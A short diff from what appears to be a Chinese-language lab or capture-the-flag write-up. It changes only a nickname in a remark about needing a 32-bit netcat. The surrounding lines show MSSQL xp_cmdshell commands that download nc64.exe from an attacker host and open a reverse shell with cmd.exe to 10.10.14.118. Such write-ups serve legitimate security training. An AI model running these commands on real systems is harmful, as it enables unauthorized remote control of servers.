@@ -224,7 +224,7 @@ EXEC xp_cmdshell 'whoami'
 EXEC xp_cmdshell "powershell -c cd C:\users\sql_svc\Downloads; wget http://10.10.14.118:8000/nc64.exe -outfile nc64.exe"
 ```
 
-运行nc64.exe报错，说系统不支持，重新下载32位的nc。迪宝之前提过但坑得自己踩才知道。
+运行nc64.exe报错，说系统不支持，重新下载32位的nc。秃子之前提过但坑得自己踩才知道。
 
 ```
 EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.118 5566"
